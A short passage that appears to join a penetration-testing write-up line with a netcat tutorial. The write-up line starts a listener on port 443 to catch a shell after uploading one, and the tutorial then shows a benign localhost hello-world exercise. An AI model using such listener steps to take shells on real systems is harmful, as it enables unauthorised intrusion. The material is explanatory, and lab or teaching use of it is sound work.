After uploading shell, we started the netcat listener by using the following command:
sudo nc -nvlp 443

nc is a useful little program that allows us to perform IO redirection with remote or local ports. We can either take input from
the terminal and send to a remote port ( nc <address> <port> ) or take input from a local port and send it to the terminal
( nc -l <port> ). These two simple modes can then be combined with IO redirection to route information into files, other
ports, and so on.
Try it out. In a terminal T 1 , do: nc -l 9001 ; then while nc is still running in T 1 , create another terminal T 2 and in T 2
issue the command: nc localhost 9001 . Still in T 2 , write hello world! and press return. This input should appear in T 1
as well; it was sent to port 9001, and T 1 â€™s nc was listening on that port and writing all incoming information to the terminal.
